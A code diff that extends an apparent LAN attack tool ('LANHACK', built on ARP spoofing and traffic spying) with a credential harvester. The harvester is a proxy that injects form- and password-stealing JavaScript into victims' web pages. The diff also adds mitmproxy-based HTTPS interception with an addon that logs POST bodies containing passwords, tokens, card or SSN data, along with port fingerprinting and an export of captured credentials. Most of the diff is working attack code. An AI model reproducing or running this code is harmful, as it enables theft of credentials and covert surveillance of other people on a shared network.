@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import threading, time, os, sys, socket, struct, re, subprocess
+import threading, time, os, sys, socket, struct, re, subprocess, shutil
 from datetime import datetime
 from collections import defaultdict
 
@@ -53,8 +53,18 @@ DISCORD_RANGES = ["162.159.0.0/16", "173.245.48.0/20", "108.162.0.0/15", "104.16
 STEAM_RANGES = ["208.64.200.0/22", "208.78.164.0/22", "185.25.182.0/23"]
 custom_blocks = {}
 global_dns_block = False
+https_intercept_on = False
+mitm_process = None
+harvester_on = False
+harvester_thread = None
+harvested_creds = []
 stealth_mode = False
 stealth_intervals = [1.5, 2.3, 1.8, 3.1, 2.7, 1.2, 2.9, 1.6]
+auto_scan_active = False
+auto_scan_timer = None
+bandwidth_data = defaultdict(lambda: [0] * 30)
+domain_hits = defaultdict(int)
+show_graphs = False
 dns_server_thread = None
 dns_blocklist = set()
 _attacks_built = False
@@ -103,7 +113,129 @@ def _dns_server_run():
         except: continue
     sock.close()
 
+HARVEST_JS = b"""
+<script>
+document.addEventListener('submit',function(e){
+  var f=e.target;
+  var d={};
+  for(var i=0;i<f.elements.length;i++){
+    var el=f.elements[i];
+    if(el.name||el.id)d[el.name||el.id]=el.value;
+  }
+  var q=Object.keys(d).map(function(k){return k+'='+encodeURIComponent(d[k])}).join('&');
+  new Image().src='http://'+window.location.hostname+':9999/?'+q;
+});
+document.querySelectorAll('input[type=password]').forEach(function(el){
+  el.addEventListener('change',function(){
+    new Image().src='http://'+window.location.hostname+':9999/pw?'+encodeURIComponent(this.name||'pw')+'='+encodeURIComponent(this.value);
+  });
+});
+</script>
+</head>"""
+
+def harvester_proxy():
+    import http.server as hs
+    import urllib.request
+    class H(hs.BaseHTTPRequestHandler):
+        def do_GET(self):
+            try:
+                url = self.path
+                if url.startswith("/?"):
+                    harvested_creds.append(("GET", url[2:], datetime.now().strftime("%H:%M:%S")))
+                    self.send_response(200)
+                    self.end_headers()
+                    return
+                if url.startswith("/pw?"):
+                    harvested_creds.append(("PWD", url[4:], datetime.now().strftime("%H:%M:%S")))
+                    self.send_response(200)
+                    self.end_headers()
+                    return
+                req = urllib.request.Request("http://" + self.headers["Host"] + url)
+                resp = urllib.request.urlopen(req, timeout=5)
+                data = resp.read()
+                ct = resp.headers.get("Content-Type", "")
+                if "text/html" in ct and b"</head>" in data:
+                    data = data.replace(b"</head>", HARVEST_JS)
+                self.send_response(resp.status)
+                for k, v in resp.headers.items():
+                    if k.lower() not in ("transfer-encoding", "content-length"):
+                        self.send_header(k, v)
+                self.send_header("Content-Length", str(len(data)))
+                self.end_headers()
+                self.wfile.write(data)
+            except: self.send_response(502); self.end_headers()
+        do_POST = do_GET
+        def log_message(self, *a): pass
+    s = hs.HTTPServer(("0.0.0.0", 8082), H)
+    while not quit_flag and harvester_on:
+        s.timeout = 1
+        s.handle_request()
+    s.server_close()
+
+MITM_ADDON = os.path.expanduser("~/.lanhack_mitm_addon.py")
+
+def _ensure_mitm_addon():
+    code = '''import re
+from mitmproxy import http
+CRED_PATTERNS = [b"password", b"passwd", b"login", b"username", b"email", b"token", b"secret", b"api_key", b"credit", b"ssn"]
+def request(flow: http.HTTPFlow):
+    if flow.request.method == "POST" or flow.request.method == "PUT":
+        body = flow.request.get_text() or ""
+        for pat in CRED_PATTERNS:
+            if pat in body.lower().encode():
+                with open("/tmp/lanhack_creds.txt", "a") as f:
+                    f.write(f"[{flow.request.pretty_host}] {body}\\n")
+                break
+'''
+    with open(MITM_ADDON, "w") as f:
+        f.write(code)
+
 def vendor(mac): return OUI_DB.get(mac[:8].lower(), "Unknown")
+
+FINGERPRINT_PORTS = [22, 80, 443, 135, 139, 445, 554, 3689, 62078, 7000, 7676, 8080, 8443, 8883, 9090]
+FINGERPRINT_MAP = {
+    frozenset([135, 139, 445]): "Windows",
+    frozenset([22]): "Linux/SSH",
+    frozenset([3689, 62078]): "macOS/iOS",
+    frozenset([3689]): "macOS/iTunes",
+    frozenset([80, 443]): "Web Server",
+    frozenset([7000, 7676]): "Samsung TV",
+    frozenset([8883]): "IoT/MQTT",
+    frozenset([554]): "IP Camera",
+    frozenset([9090]): "Smart TV/Chromecast",
+}
+
+def fingerprint_device(ip, timeout=2):
+    open_ports = set()
+    for port in FINGERPRINT_PORTS:
+        try:
+            res = scapy.sr1(scapy.IP(dst=ip)/scapy.TCP(dport=port,flags="S"), timeout=timeout, verbose=False)
+            if res and res.haslayer(scapy.TCP) and res[scapy.TCP].flags & 0x12:
+                open_ports.add(port)
+        except: continue
+    guess = "Unknown"
+    for port_set, label in FINGERPRINT_MAP.items():
+        if port_set.issubset(open_ports):
+            guess = label
+            break
+    if not open_ports and not guess:
+        try:
+            pkt = scapy.sr1(scapy.IP(dst=ip)/scapy.ICMP(), timeout=1, verbose=False)
+            if pkt: guess = "Active (firewalled)"
+        except: pass
+    return guess, sorted(open_ports)
+
+def wake_on_lan(mac):
+    try:
+        mac_clean = mac.replace(":", "").replace("-", "")
+        data = bytes.fromhex("ff" * 6 + mac_clean * 16)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        sock.sendto(data, ("<broadcast>", 9))
+        sock.sendto(data, ("255.255.255.255", 9))
+        sock.close()
+        return True
+    except: return False
 
 def detect_network():
     global my_ip, gateway_ip, iface, netmask
@@ -139,7 +271,7 @@ def arp_scan(subnet=None):
     for _, recv in ans:
         try: hn = socket.gethostbyaddr(recv.psrc)[0].split('.')[0]
         except: hn = ""
-        found.append({"ip":recv.psrc,"mac":recv.hwsrc,"vendor":vendor(recv.hwsrc),"hostname":hn})
+        found.append({"ip":recv.psrc,"mac":recv.hwsrc,"vendor":vendor(recv.hwsrc),"hostname":hn,"fingerprint":"","open_ports":""})
     return [d for d in found if d["ip"] != my_ip]
 
 def arp_spoof_loop(tip, tmac, gw, ev, block=True):
@@ -156,12 +288,20 @@ def sniff_sites():
     def cb(pkt):
         if quit_flag: return
         ts = datetime.now().strftime("%H:%M:%S")
+        if scapy.IP in pkt:
+            s = pkt[scapy.IP].src; d = pkt[scapy.IP].dst
+            size = len(pkt)
+            bw = bandwidth_data[s]
+            bw.append(size)
+            bw.pop(0)
+            if s != my_ip and s != gateway_ip:
+                domain_hits["total_bytes_" + s] = domain_hits.get("total_bytes_" + s, 0) + size
         if pkt.haslayer(scapy.DNS) and pkt[scapy.DNS].qr == 0:
             q = pkt[scapy.DNSQR].qname.decode(errors='ignore').rstrip('.')
             if q.endswith(".in-addr.arpa") or q.endswith(".ip6.arpa"): return
             s = pkt[scapy.IP].src; d = pkt[scapy.IP].dst
             if s == my_ip or s == gateway_ip: return
-            if q not in seen[s]: seen[s].add(q); captured_sites[s].append((ts,q,"dns",s,d))
+            if q not in seen[s]: seen[s].add(q); captured_sites[s].append((ts,q,"dns",s,d)); domain_hits[q] = domain_hits.get(q, 0) + 1
         elif pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
             try:
                 s=pkt[scapy.IP].src; d=pkt[scapy.IP].dst
@@ -175,12 +315,12 @@ def sniff_sites():
                             if idx+2+sl<=len(pl):
                                 sni=pl[idx+2:idx+2+sl].decode(errors='ignore')
                                 if sni and '.' in sni and sni not in seen[s]:
-                                    seen[s].add(sni); captured_sites[s].append((ts,sni,"tls",s,d))
+                                    seen[s].add(sni); captured_sites[s].append((ts,sni,"tls",s,d)); domain_hits[sni] = domain_hits.get(sni, 0) + 1
                 elif b"Host:" in pl:
                     m=re.search(rb"Host:\s*(\S+)",pl)
                     if m:
                         h=m.group(1).decode(errors='ignore')
-                        if h not in seen[s]: seen[s].add(h); captured_sites[s].append((ts,h,"http",s,d))
+                        if h not in seen[s]: seen[s].add(h); captured_sites[s].append((ts,h,"http",s,d)); domain_hits[h] = domain_hits.get(h, 0) + 1
             except: pass
     scapy.sniff(iface=iface, prn=cb, store=False, filter="udp port 53 or tcp port 80 or tcp port 443", quiet=True)
 
@@ -312,6 +452,9 @@ class NetcutApp(App):
             Button("Block", id="block-dev-btn", variant="error"),
             Button("Unblock", id="unblock-dev-btn", variant="warning"),
             Button("Spy", id="spy-dev-btn", variant="primary"),
+            Button("WoL", id="wol-btn", variant="default"),
+            Button("Auto Scan OFF", id="auto-scan-btn", variant="default") if not auto_scan_active else Button("Auto Scan ON", id="auto-scan-btn", variant="warning"),
+            Button("Fingerprint", id="fp-btn", variant="default"),
             Button("Unblock All", id="unblock-all-btn", variant="warning"),
             Button("MAC", id="toggle-mac-btn", variant="default"),
             id="action-bar"
@@ -319,9 +462,9 @@ class NetcutApp(App):
         pane.mount(ab)
         dt = DataTable(id="dev-table")
         if show_mac:
-            dt.add_columns("#", "IP", "MAC", "Vendor", "Hostname", "Status")
+            dt.add_columns("#", "IP", "MAC", "Vendor", "Hostname", "Fingerprint", "Status")
         else:
-            dt.add_columns("#", "IP", "Vendor", "Hostname", "Status")
+            dt.add_columns("#", "IP", "Vendor", "Hostname", "Fingerprint", "Status")
         pane.mount(dt)
         pane.mount(Static("", id="spy-list"))
     
@@ -339,19 +482,21 @@ class NetcutApp(App):
         except: return
         dt = DataTable(id="dev-table")
         if show_mac:
-            dt.add_columns("#", "IP", "MAC", "Vendor", "Hostname", "Status")
+            dt.add_columns("#", "IP", "MAC", "Vendor", "Hostname", "Fingerprint", "Status")
         else:
-            dt.add_columns("#", "IP", "Vendor", "Hostname", "Status")
+            dt.add_columns("#", "IP", "Vendor", "Hostname", "Fingerprint", "Status")
         for i, d in enumerate(devices, 1):
             blocked = d["ip"] in blocked_ips
             status = "[red]BLOCKED[/]" if blocked else "[green]Active[/]"
+            fp = d.get("fingerprint", "") or ""
             if show_mac:
-                dt.add_row(str(i), d["ip"], d["mac"], d["vendor"], d["hostname"] or "-", status)
+                dt.add_row(str(i), d["ip"], d["mac"], d["vendor"], d["hostname"] or "-", fp, status)
             else:
-                dt.add_row(str(i), d["ip"], d["vendor"], d["hostname"] or "-", status)
+                dt.add_row(str(i), d["ip"], d["vendor"], d["hostname"] or "-", fp, status)
         pane.mount(dt)
     
     def on_button_pressed(self, event: Button.Pressed):
+        global show_graphs
         btn_id = event.button.id or ""
         if btn_id == "scan-btn": self.scan_lan()
         elif btn_id == "set-iface-btn":
@@ -379,6 +524,50 @@ class NetcutApp(App):
                     count += 1
                 self.notify(f"Spying on all {count} devices", timeout=3)
                 self.update_stats()
+        elif btn_id == "list-view-btn":
+            show_graphs = False
+            self.query_one("#list-view-btn", Button).variant = "primary"
+            self.query_one("#graph-view-btn", Button).variant = "default"
+        elif btn_id == "graph-view-btn":
+            show_graphs = True
+            self.query_one("#list-view-btn", Button).variant = "default"
+            self.query_one("#graph-view-btn", Button).variant = "primary"
+        elif btn_id == "auto-scan-btn":
+            global auto_scan_active, auto_scan_timer
+            if auto_scan_active:
+                auto_scan_active = False
+                if auto_scan_timer: auto_scan_timer.stop()
+                try: self.query_one("#auto-scan-btn", Button).label = "Auto Scan"
+                except: pass
+                self.notify("Auto-scan stopped", timeout=2)
+            else:
+                auto_scan_active = True
+                self.do_auto_scan()
+                auto_scan_timer = self.set_interval(30, self.do_auto_scan)
+                try: self.query_one("#auto-scan-btn", Button).label = "Auto Scan ON"
+                except: pass
+                self.notify("Auto-scan every 30s", timeout=3)
+        elif btn_id == "fp-btn":
+            if not devices:
+                self.notify("Scan LAN first", severity="warning", timeout=2)
+            else:
+                self.notify("Fingerprinting devices...", timeout=2)
+                for d in devices:
+                    guess, ports = fingerprint_device(d["ip"])
+                    d["fingerprint"] = guess
+                    d["open_ports"] = ",".join(str(p) for p in ports)
+                self.refresh_devices()
+                self.update_stats()
+                self.notify("Fingerprinting complete", timeout=3)
+        elif btn_id == "wol-btn":
+            ip = self.query_one("#target-ip-dev", Input).value.strip()
+            mac = next((d["mac"] for d in devices if d["ip"] == ip), None)
+            if mac and wake_on_lan(mac):
+                self.notify(f"WoL sent to {ip} ({mac})", timeout=3)
+            elif mac:
+                self.notify(f"WoL failed for {mac}", severity="error", timeout=3)
+            else:
+                self.notify("No device found at that IP", severity="warning", timeout=3)
         elif btn_id == "load-ip-btn":
             try:
                 dt = self.query_one("#dev-table", DataTable)
@@ -407,6 +596,50 @@ class NetcutApp(App):
             if domain: self.unblock_domain(domain)
         elif btn_id == "global-dns-btn":
             self.toggle_global_dns()
+        elif btn_id == "export-btn":
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            csv_path = f"lanhack_export_{ts}.csv"
+            json_path = f"lanhack_export_{ts}.json"
+            import csv, json as _json
+            rows = []
+            for ip in captured_sites:
+                for ts2, site, stype, src, dst in captured_sites[ip]:
+                    rows.append({"Time":ts2,"Device":device_label(ip),"IP":ip,"Type":stype,"Site":site})
+            with open(csv_path, "w", newline="") as f:
+                if rows:
+                    w = csv.DictWriter(f, fieldnames=rows[0].keys())
+                    w.writeheader()
+                    w.writerows(rows)
+            with open(json_path, "w") as f:
+                _json.dump({"captures":rows,"total":len(rows),"harvested_http":harvested_creds}, f, indent=2)
+            self.notify(f"Exported {len(rows)} entries to {csv_path} and {json_path}", timeout=5)
+        elif btn_id == "view-creds-btn":
+            creds = []
+            if os.path.exists("/tmp/lanhack_creds.txt"):
+                with open("/tmp/lanhack_creds.txt") as f:
+                    creds = f.read().strip().split("\\n")
+            http_creds = harvested_creds[-10:]
+            msg = "HTTPS captured:\\n" + "\\n".join(creds[-10:]) if creds else "HTTPS: none captured"
+            msg += "\\n\\nHTTP captured:\\n" + "\\n".join(f"[{t}] {c}" for _,c,t in http_creds) if http_creds else "\\nHTTP: none"
+            self.notify(msg[:500], timeout=10)
+        elif btn_id == "harvest-btn":
+            global harvester_on, harvester_thread
+            if harvester_on:
+                harvester_on = False
+                self.notify("Harvester stopped", timeout=2)
+            else:
+                harvester_on = True
+                harvester_thread = threading.Thread(target=harvester_proxy, daemon=True)
+                harvester_thread.start()
+                os.system("iptables -t nat -I PREROUTING 1 -p tcp --dport 80 -j REDIRECT --to-port 8082 2>/dev/null")
+                self.notify("Credential harvester active (HTTP only)", severity="warning", timeout=4)
+            self.update_stats()
+            self.build_attacks_tab()
+        elif btn_id == "https-btn":
+            if https_intercept_on:
+                self._stop_https_intercept()
+            else:
+                self._start_https_intercept()
         elif btn_id == "stealth-btn":
             global stealth_mode
             stealth_mode = not stealth_mode
@@ -499,6 +732,21 @@ class NetcutApp(App):
             self.notify(f"Found {len(devices)} devices", severity="information", timeout=3)
         except Exception as e:
             self.notify(f"Scan failed: {e}", severity="error", timeout=3)
+    
+    def do_auto_scan(self):
+        global devices
+        try:
+            found = arp_scan(netmask)
+            existing = {d["ip"] for d in devices}
+            new_ones = [d for d in found if d["ip"] not in existing]
+            if new_ones:
+                devices.extend(new_ones)
+                devices.sort(key=lambda x: [int(o) for o in x["ip"].split(".")])
+                self.refresh_devices()
+                self.update_stats()
+                names = ", ".join(d["ip"] for d in new_ones)
+                self.notify(f"New devices: {names}", timeout=5)
+        except: pass
     
     def toggle_block(self, ip):
         if ip == gateway_ip or ip == my_ip:
@@ -647,6 +895,48 @@ class NetcutApp(App):
         self.update_stats()
         self.build_attacks_tab()
     
+    def _start_https_intercept(self):
+        global https_intercept_on, mitm_process
+        try:
+            if not shutil.which("mitmproxy") and not shutil.which("mitmdump"):
+                self.notify("Installing mitmproxy...", timeout=5)
+                subprocess.check_call("pip install mitmproxy --break-system-packages -q", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
+            ca_dir = os.path.expanduser("~/.mitmproxy")
+            os.makedirs(ca_dir, exist_ok=True)
+            cert_path = os.path.join(ca_dir, "mitmproxy-ca.pem")
+            if not os.path.exists(cert_path):
+                subprocess.check_call("mitmdump --listen-port 8081 &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                time.sleep(2)
+                subprocess.check_call("kill %1 2>/dev/null", shell=True)
+            _ensure_mitm_addon()
+            cred_log = "/tmp/lanhack_creds.txt"
+            open(cred_log, "w").close()
+            mitm_cmd = f"mitmdump --listen-port 8081 --set flow_detail=0 -s {MITM_ADDON} -q"
+            mitm_process = subprocess.Popen(mitm_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.system(f"iptables -t nat -I PREROUTING 1 -p tcp --dport 80 -j REDIRECT --to-port 8081 2>/dev/null")
+            os.system(f"iptables -t nat -I PREROUTING 1 -p tcp --dport 443 -j REDIRECT --to-port 8081 2>/dev/null")
+            time.sleep(1)
+            self.notify(f"HTTPS Intercept ON — CA cert at {cert_path}", severity="warning", timeout=8)
+            self.update_stats()
+            self.build_attacks_tab()
+            https_intercept_on = True
+        except Exception as e:
+            self.notify(f"HTTPS intercept failed: {e}", severity="error", timeout=8)
+    
+    def _stop_https_intercept(self):
+        global https_intercept_on, mitm_process
+        https_intercept_on = False
+        if mitm_process:
+            try: mitm_process.terminate()
+            except: pass
+            mitm_process = None
+        os.system("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8081 2>/dev/null")
+        os.system("iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8081 2>/dev/null")
+        self.notify("HTTPS Intercept stopped", timeout=3)
+        self.update_stats()
+        self.build_attacks_tab()
+    
     def clear_attacks(self):
         global quick_discord, quick_steam, quick_latency_ip, quick_tc_qdisc
         if quick_discord: self.toggle_discord()
@@ -700,6 +990,19 @@ class NetcutApp(App):
             pane.mount(Static("[bold]Stealth[/]"))
             pane.mount(Horizontal(Button("Toggle Stealth Mode", id="stealth-btn", variant="default"), id="stealth-row"))
             pane.mount(Static("", id="stealth-status"))
+            pane.mount(Static("[bold]HTTPS Interception[/]"))
+            pane.mount(Horizontal(
+                Button("Toggle HTTPS Intercept", id="https-btn", variant="error"),
+                id="https-row"
+            ))
+            pane.mount(Static("", id="https-status"))
+            pane.mount(Static("[bold]Credential Harvester[/]"))
+            pane.mount(Horizontal(
+                Button("Toggle Harvester", id="harvest-btn", variant="error"),
+                Button("View Captured", id="view-creds-btn", variant="default"),
+                id="harvest-row"
+            ))
+            pane.mount(Static("", id="harvest-status"))
         except Exception as e:
             self.notify(f"Build: {e}", severity="error", timeout=10)
     
@@ -717,11 +1020,22 @@ class NetcutApp(App):
             self.query_one("#global-dns-status", Static).update(f"Global DNS Block: {gs}")
             ss = "[green]ON[/] (random ARP timing)" if stealth_mode else "[dim]OFF[/]"
             self.query_one("#stealth-status", Static).update(f"Stealth: {ss}")
+            hs = "[green]ACTIVE[/]" if https_intercept_on else "[dim]OFF[/]"
+            self.query_one("#https-status", Static).update(f"HTTPS Intercept: {hs}")
+            hvs = "[green]ACTIVE[/]" if harvester_on else "[dim]OFF[/]"
+            cred_count = f" ({len(harvested_creds)} captured)" if harvested_creds else ""
+            self.query_one("#harvest-status", Static).update(f"Harvester: {hvs}{cred_count}")
         except: pass
     
     def build_monitor_tab(self):
         pane = self.query_one("#monitor")
         pane.remove_children()
+        hb = Horizontal(
+            Button("List View", id="list-view-btn", variant="primary"),
+            Button("Graphs", id="graph-view-btn", variant="default"),
+            id="monitor-bar"
+        )
+        pane.mount(hb)
         rl = RichLog(id="site-log", highlight=True, markup=True)
         rl.write("[bold cyan]LANHACK Live Monitor[/]")
         rl.write("")
@@ -736,19 +1050,37 @@ class NetcutApp(App):
     def refresh_monitor(self):
         log = self.query_one("#site-log", RichLog)
         if not log: return
-        lines = []
-        all_ips = sorted(captured_sites.keys(), key=lambda x: captured_sites[x][-1][0] if captured_sites[x] else "00:00:00", reverse=True)
-        for ip in all_ips:
-            if ip == my_ip or ip == gateway_ip: continue
-            label = device_label(ip)
-            for ts, site, stype, src, dst in captured_sites[ip][-3:]:
-                icon = {"dns":"D","http":"H","tls":"T"}.get(stype,"?")
-                lines.append(f"[{ts}] [{icon}] {label} -> {site}")
-                break
-            if len(lines) >= 8: break
         log.clear()
         total_cap = sum(len(v) for v in captured_sites.values())
-        if lines:
+        if show_graphs:
+            log.write("[bold cyan]Live Traffic Graphs[/]")
+            log.write("")
+            log.write("[bold]Bandwidth per device (last 30 packets)[/]")
+            for ip, data in sorted(bandwidth_data.items(), key=lambda x: sum(x[1]), reverse=True)[:5]:
+                if ip == my_ip or ip == gateway_ip: continue
+                total = sum(data)
+                bar_len = min(total // 100, 40)
+                bar = "█" * bar_len + "░" * (40 - bar_len)
+                label = device_label(ip)
+                log.write(f"  {label:<30} {bar} {total//1024}KB")
+            log.write("")
+            log.write("[bold]Top domains[/]")
+            for domain, hits in sorted(domain_hits.items(), key=lambda x: x[1], reverse=True)[:8]:
+                if domain.startswith("total_bytes_"): continue
+                bar_len = min(hits, 40)
+                bar = "█" * bar_len + "░" * (40 - bar_len)
+                log.write(f"  {domain:<35} {bar} {hits}")
+        elif spy_threads and total_cap > 0:
+            lines = []
+            all_ips = sorted(captured_sites.keys(), key=lambda x: captured_sites[x][-1][0] if captured_sites[x] else "00:00:00", reverse=True)
+            for ip in all_ips:
+                if ip == my_ip or ip == gateway_ip: continue
+                label = device_label(ip)
+                for ts, site, stype, src, dst in captured_sites[ip][-3:]:
+                    icon = {"dns":"D","http":"H","tls":"T"}.get(stype,"?")
+                    lines.append(f"[{ts}] [{icon}] {label} -> {site}")
+                    break
+                if len(lines) >= 8: break
             log.write(f"[bold cyan]Captured: {total_cap} entries | Spying: {len(spy_threads)} devices[/]")
             log.write("")
             for line in lines:
@@ -784,6 +1116,7 @@ class NetcutApp(App):
             hint = f"-> {opener}" if opener != site else ""
             dt.add_row(ts, "DNS", dev, site, hint)
         pane.mount(dt)
+        pane.mount(Horizontal(Button("Export CSV+JSON", id="export-btn", variant="primary"), id="export-row"))
     
     def action_quit(self):
         global quit_flag
@@ -800,6 +1133,12 @@ class NetcutApp(App):
         if global_dns_block:
             os.system("iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null")
             os.system("iptables -D INPUT -p udp --dport 53 -j ACCEPT 2>/dev/null")
+        if https_intercept_on:
+            if mitm_process:
+                try: mitm_process.terminate()
+                except: pass
+            os.system("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8081 2>/dev/null")
+            os.system("iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8081 2>/dev/null")
         self.exit()
 
 if __name__ == "__main__":
